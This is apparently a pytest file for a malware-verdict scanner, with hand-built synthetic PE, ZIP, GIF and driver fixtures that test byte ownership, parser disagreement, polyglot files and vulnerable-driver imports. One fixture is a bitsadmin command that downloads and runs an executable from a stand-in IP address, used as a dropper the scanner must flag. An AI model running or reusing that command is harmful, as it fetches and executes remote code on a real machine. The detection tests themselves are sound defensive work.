"""Coverage wave 3 tests: every byte has an owner.

Synthetic fixtures only, hand-built in this file (a small PE
builder with imports, subsystem and certificate support). No
sample was downloaded. See validation/COVERAGE-WAVE-3-LOG.md for
the diagnosis (prior behaviour proven by probe), what was built,
and the named remainder.

Per item: a positive case that must cap with the reason named,
and a control that keeps its NO path.
"""
import io
import os
import struct
import sys
import tarfile
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero import verdict as verdict_mod
from event_zero.verdict import verdict
from event_zero.coverage3 import (byte_ownership, dual_parser,
                                  polyglot_identities,
                                  driver_capabilities)


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def blockers_text(v):
    return "\n".join(v.get("blockers") or []) + "\n" + \
        "\n".join(u for u in v.get("unaccounted") or [])


def _align(x, a):
    return (x + a - 1) // a * a


def build_pe(sections, entry_rva=0x1000, subsystem=3, imports=None):
    """sections: list of (name, vsize, raw_bytes); imports: list of
    (dll_name, [func_names]). A synthetic PE32+."""
    opt_size = 240
    headers_end = 0x80 + 4 + 20 + opt_size + 40 * (len(sections) + (1 if imports else 0))
    first_raw = _align(headers_end, 0x200)
    rva, raw_ptr, secs = 0x1000, first_raw, []
    for name, vsize, raw in sections:
        secs.append([name, vsize, rva, raw_ptr, raw])
        rva += _align(max(vsize, len(raw), 1), 0x1000)
        raw_ptr += len(raw)
    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, len(secs) + (1 if imports else 0),
                       0, 0, 0, opt_size, 0x22)
    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, 0x20b)
    struct.pack_into("<I", opt, 16, entry_rva)
    struct.pack_into("<I", opt, 56, rva + (0x1000 if imports else 0))
    struct.pack_into("<I", opt, 60, first_raw)
    struct.pack_into("<H", opt, 68, subsystem)
    struct.pack_into("<I", opt, 108, 16)
    if imports:
        isec_rva, isec_raw = rva, raw_ptr
        ndesc = len(imports)
        cur = 20 * (ndesc + 1)
        tables = []
        for dll, funcs in imports:
            ilt = cur
            cur += 8 * (len(funcs) + 1)
            iat = cur
            cur += 8 * (len(funcs) + 1)
            tables.append((dll, funcs, ilt, iat))
        body = bytearray(cur + 4096)
        for i, (dll, funcs, ilt, iat) in enumerate(tables):
            entries = []
            for fn in funcs:
                hn = cur
                body[hn + 2:hn + 2 + len(fn) + 1] = fn.encode() + b"\x00"
                cur += 2 + len(fn) + 1
                if cur % 2:
                    cur += 1
                entries.append(isec_rva + hn)
            for j, e in enumerate(entries):
                struct.pack_into("<Q", body, ilt + 8 * j, e)
                struct.pack_into("<Q", body, iat + 8 * j, e)
            noff = cur
            body[noff:noff + len(dll) + 1] = dll.encode() + b"\x00"
            cur += len(dll) + 1
            struct.pack_into("<IIIII", body, 20 * i, isec_rva + ilt, 0, 0,
                             isec_rva + noff, isec_rva + iat)
        idata = bytes(body[:cur])
        secs.append([b".idata", len(idata), isec_rva, isec_raw, idata])
        struct.pack_into("<II", opt, 112 + 8, isec_rva, 20 * (ndesc + 1))
    out = bytearray(dos)
    out += b"PE\x00\x00" + coff + bytes(opt)
    for name, vsize, srva, sraw, raw in secs:
        sec = bytearray(40)
        sec[0:len(name)] = name
        struct.pack_into("<IIII", sec, 8, vsize, srva, len(raw), sraw)
        out += sec
    out = out.ljust(first_raw, b"\x00")
    for name, vsize, srva, sraw, raw in secs:
        assert len(out) == sraw
        out += raw
    return bytes(out)


CODE = b"\x90" * 32 + b"\xc3" + b"\x00" * 29
CLEAN_PE = build_pe([(b".text", len(CODE), CODE)])
DROPPER_CMD = ("bitsadmin /transfer j http://198.51.100.9/p.exe "
               "C:\\p.exe && C:\\p.exe\n")


def zip_bytes(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in members:
            z.writestr(name, data)
    return buf.getvalue()


def gif_bytes():
    return b"GIF89a" + struct.pack("<HH", 1, 1) + b"\x00\x00\x00" + b";"


# ======================================================================
# 1. Byte ownership
# ======================================================================

def test_ownership_pe_clean_twin_complete():
    own = byte_ownership("clean.exe", CLEAN_PE)
    assert own["format"] == "PE" and own["complete"]
    assert own["material_unowned"] == []


def test_ownership_pe_overlay_is_unowned():
    blob = CLEAN_PE + b"\x41" * 300 + b"PAYLOADMARKER" + b"\x42" * 300
    own = byte_ownership("overlay.exe", blob)
    assert not own["complete"]
    mat = own["material_unowned"]
    assert len(mat) == 1 and mat[0]["start"] == len(CLEAN_PE)
    assert "overlay" in mat[0]["reason"]


def test_ownership_pe_section_slack_is_unowned():
    raw = CODE + b"SLACKPAYLOAD" * 16
    blob = build_pe([(b".text", len(CODE), raw)])
    own = byte_ownership("slack.exe", blob)
    assert not own["complete"]
    assert any("section slack" in m["reason"] for m in own["material_unowned"])


def test_ownership_zip_clean_and_appended():
    z = zip_bytes([("notes.txt", "hello benign\n")])
    own = byte_ownership("bundle.zip", z)
    assert own["complete"], own["material_unowned"]
    own2 = byte_ownership("bundle.zip", z + b"\x99" * 500)
    assert not own2["complete"]
    assert any("past the end of the central directory" in m["reason"]
               for m in own2["material_unowned"])


def test_ownership_elf_fixture_complete():
    path = os.path.join(os.path.dirname(__file__), "..", "fixtures", "hello_elf")
    with open(path, "rb") as f:
        data = f.read()
    own = byte_ownership("hello_elf", data)
    assert own["format"] == "ELF" and own["complete"], own["material_unowned"]
    own2 = byte_ownership("hello_elf", data + b"\x77" * 400)
    assert not own2["complete"]


def test_verdict_zip_appended_pe_caps(tmp_path):
    blob = zip_bytes([("notes.txt", "hello benign\n")]) + CLEAN_PE
    v = verdict(write(tmp_path, "bundle.zip", blob))
    assert v["headline"] != "NO: NO MALWARE"
    text = blockers_text(v)
    assert "byte-ownership" in text or "polyglot" in text


def test_verdict_zip_clean_reaches_no(tmp_path):
    v = verdict(write(tmp_path, "bundle.zip",
                      zip_bytes([("notes.txt", "hello benign\n")])))
    assert v["headline"] == "NO: NO MALWARE"


def test_verdict_tar_appended_caps_and_clean_tar_no(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo("notes.txt")
        payload = b"hello benign\n"
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
    tar = buf.getvalue()
    v = verdict(write(tmp_path, "bundle.tar", tar))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
    v2 = verdict(write(tmp_path, "bundle2.tar", tar + b"\x55" * 600))
    assert v2["headline"] != "NO: NO MALWARE"
    assert "byte-ownership" in blockers_text(v2)


# ======================================================================
# 2. Dual-parser differential gate
# ======================================================================

def test_dual_parser_clean_pe_agrees(tmp_path):
    p = write(tmp_path, "clean.exe", CLEAN_PE)
    d = dual_parser(CLEAN_PE, p)
    assert d["available"] and len(d["parsers"]) >= 2
    assert d["disagreements"] == [], d["disagreements"]


def test_dual_parser_section_count_disagreement(tmp_path):
    blob = bytearray(CLEAN_PE)
    struct.pack_into("<H", blob, 0x80 + 4 + 2, 5)  # declares 5 sections, has 1
    p = write(tmp_path, "weird.exe", bytes(blob))
    d = dual_parser(bytes(blob), p)
    assert d["available"] and d["disagreements"], d


def test_dual_parser_inflated_raw_size_disagreement(tmp_path):
    blob = bytearray(CLEAN_PE)
    struct.pack_into("<I", blob, 0x80 + 4 + 20 + 240 + 16, 0x5000)
    p = write(tmp_path, "inflated.exe", bytes(blob))
    d = dual_parser(bytes(blob), p)
    assert d["available"] and d["disagreements"], d


def test_verdict_dual_parser_disagreement_named(tmp_path):
    blob = bytearray(CLEAN_PE)
    struct.pack_into("<H", blob, 0x80 + 4 + 2, 5)
    v = verdict(write(tmp_path, "weird.exe", bytes(blob)))
    assert v["headline"] != "NO: NO MALWARE"
    assert "dual-parser differential" in blockers_text(v)


def test_dual_parser_elf_fixture_agrees():
    path = os.path.join(os.path.dirname(__file__), "..", "fixtures", "hello_elf")
    with open(path, "rb") as f:
        data = f.read()
    d = dual_parser(data, path)
    assert d["available"] and d["disagreements"] == [], d["disagreements"]


# ======================================================================
# 3. Polyglot accounting
# ======================================================================

def test_polyglot_identities_detected():
    ids = polyglot_identities(CLEAN_PE + zip_bytes([("a.txt", "x\n")]))
    assert {i["format"] for i in ids} == {"PE", "ZIP archive"}
    ids = polyglot_identities(gif_bytes() + zip_bytes([("a.txt", "x\n")]))
    assert {i["format"] for i in ids} == {"GIF image", "ZIP archive"}
    assert [i["format"] for i in polyglot_identities(CLEAN_PE)] == ["PE"]


def test_verdict_gif_zip_benign_polyglot_reaches_no(tmp_path):
    blob = gif_bytes() + zip_bytes([("notes.txt", "hello benign\n")])
    v = verdict(write(tmp_path, "pic.gif", blob))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
    rec = [f for f in v["files"] if f["path_in_release"] == "pic.gif"][0]
    assert rec.get("polyglot"), rec


def test_verdict_gif_zip_dropper_member_judged(tmp_path):
    blob = gif_bytes() + zip_bytes([("run.cmd", DROPPER_CMD)])
    v = verdict(write(tmp_path, "pic.gif", blob))
    assert v["headline"] != "NO: NO MALWARE"
    assert any(f["path_in_release"].endswith("run.cmd") for f in v["files"])


def test_verdict_pe_zip_script_member_judged(tmp_path):
    blob = CLEAN_PE + zip_bytes([("run.cmd", DROPPER_CMD),
                                 ("notes.txt", "hello\n")])
    v = verdict(write(tmp_path, "poly.exe", blob))
    assert v["headline"] != "NO: NO MALWARE"
    assert any(f["path_in_release"].endswith("run.cmd") for f in v["files"])


def test_verdict_jar_appended_payload_caps(tmp_path):
    jar = zip_bytes([("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n\n"),
                     ("notes.txt", "hello benign\n")])
    v = verdict(write(tmp_path, "app.jar", jar + CLEAN_PE))
    assert v["headline"] != "NO: NO MALWARE"
    assert "polyglot" in blockers_text(v) or "byte-ownership" in blockers_text(v)


# ======================================================================
# 4. BYOVD carve-out
# ======================================================================

DRIVER_BODY = b"\x90" * 16 + b"\x00" * 16
DANGER_DRIVER = build_pe(
    [(b".text", len(DRIVER_BODY), DRIVER_BODY)], subsystem=1,
    imports=[("ntoskrnl.exe", ["MmMapIoSpace", "MmCopyVirtualMemory",
                               "ZwTerminateProcess", "IoCreateDevice",
                               "__readmsr", "READ_PORT_UCHAR",
                               "ZwLoadDriver"])])
BENIGN_DRIVER = build_pe(
    [(b".text", len(DRIVER_BODY), DRIVER_BODY)], subsystem=1,
    imports=[("ntoskrnl.exe", ["IoCreateDevice", "IoCompleteRequest",
                               "ZwClose"])])


def test_driver_capabilities_extraction():
    d = driver_capabilities("danger.sys", DANGER_DRIVER)
    assert d["is_driver"]
    cats = {c["category"] for c in d["capabilities"]}
    assert {"physical-memory-access", "virtual-memory-access",
            "msr-access", "port-io", "process-termination",
            "driver-load-and-dse-surface"} <= cats, cats
    ev = " ".join(e for c in d["capabilities"] for e in c["evidence"])
    assert "MmMapIoSpace" in ev and "ZwTerminateProcess" in ev
    b = driver_capabilities("benign.sys", BENIGN_DRIVER)
    assert b["is_driver"] and b["capabilities"] == []


def test_verdict_byovd_genuine_driver_refused_clean(tmp_path, monkeypatch):
    monkeypatch.setattr(verdict_mod, "pe_signature",
                        lambda data: (True, True) if data[:2] == b"MZ" else (None, None))
    subj = write(tmp_path, "danger.sys", DANGER_DRIVER, "rel")
    write(tmp_path, "danger.sys", DANGER_DRIVER, "ref")
    v = verdict(subj, reference=str(tmp_path / "ref"))
    assert v["headline"] != "NO: NO MALWARE", blockers_text(v)
    text = blockers_text(v)
    assert "BYOVD carve-out" in text and "MmMapIoSpace" in text
    rec = [f for f in v["files"] if f["path_in_release"] == "danger.sys"][0]
    assert rec.get("driver_capabilities", {}).get("capabilities")


def test_verdict_benign_signed_driver_keeps_no(tmp_path, monkeypatch):
    monkeypatch.setattr(verdict_mod, "pe_signature",
                        lambda data: (True, True) if data[:2] == b"MZ" else (None, None))
    subj = write(tmp_path, "benign.sys", BENIGN_DRIVER, "rel")
    write(tmp_path, "benign.sys", BENIGN_DRIVER, "ref")
    v = verdict(subj, reference=str(tmp_path / "ref"))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
